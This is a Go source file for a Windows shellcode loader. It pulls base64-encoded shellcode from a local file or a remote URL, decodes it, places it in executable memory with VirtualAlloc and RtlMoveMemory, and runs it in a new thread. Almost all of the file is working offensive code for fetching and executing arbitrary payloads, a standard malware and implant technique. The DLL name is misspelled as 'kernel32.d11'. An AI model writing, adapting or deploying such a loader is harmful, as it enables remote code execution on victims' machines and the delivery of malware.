package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	kernel32                = windows.NewLazySystemDLL("kernel32.d11")
	procCreateThread        = kernel32.NewProc("CreateThread")
	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	procRtlMoveMemory       = kernel32.NewProc("RtlMoveMemory")
)

// Check Error
func checkError(err error, msg string) {
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] %s: %v\n", msg, err)
		os.Exit(1)
	}

}

// Load Shellcode - local or remote?
func loadShellFromFile(path string) []byte {
	data, err := os.ReadFile(path)
	checkError(err, "Fail to locate the file")
	return data
}

func loadShellFromUrl(url string) []byte {
	res, err := http.Get(url)
	defer res.Body.Close()
	data, err := io.ReadAll(res.Body)
	checkError(err, "Fail to load data from url")
	return data
}

// Base64 decode
func decodeBase64(data []byte) []byte {
	// StdEncoding is the standard RFC 4648 encoding
	decodedBytes, err := base64.StdEncoding.DecodeString(string(data))
	checkError(err, "Fail to decode Base64 shellcode")
	return decodedBytes
}

// Execute Shellcode
func executeShellcode(shellcode []byte) {
	// allocate memory
	addr, err := windows.VirtualAlloc(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	checkError(err, "Virtual allocate memory error")

	// copy the shellcode to memory
	ret, _, err := procRtlMoveMemory.Call(
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)
	if ret == 0 {
		checkError(fmt.Errorf("RtlMemory returned 0"), "Fail to copy shellcode")
	}

	// Create Threads to execute shellcode
	thread, _, err := procCreateThread.Call(
		0, 0, addr, 0, 0, 0,
	)
	if thread == 0 {
		checkError(err, "Create thread failed")
	}

	// Wait for thread to finish execution
	_, _, err = procWaitForSingleObject.Call(
		thread,
		windows.INFINITE,
	)
	if err != windows.ERROR_SUCCESS && err != nil {
		checkError(err, "Wait for SingleObject failed")
	}
}

func main() {
	localPath := flag.String("local", "", "Path to local base64 shellcode file")
	remoteUrl := flag.String("remote", "", "Url to remote base64 shellcode file")
	flag.Parse()

	var encodedShellcode []byte

	if *localPath != "" {
		fmt.Println("[+] Loading shellcode from local file...")
		encodedShellcode = loadShellFromFile(*localPath)
	} else if *remoteUrl != "" {
		fmt.Println("[+] Loading shellcode from remote URL...")
		encodedShellcode = loadShellFromUrl(*remoteUrl)
	} else {
		fmt.Println("[!] Missing -local or -remote option")
		fmt.Println("Usage:")
		fmt.Println(" golopas.exe -local C:\\path\\to\\shellcode.enc")
		fmt.Println(" golopas.exe -remote http://host/shellcode.enc")
		os.Exit(1)
	}

	shellcode := decodeBase64(encodedShellcode)
	fmt.Println("[+] Shellcode decoded. Executing...")
	executeShellcode(shellcode)
}
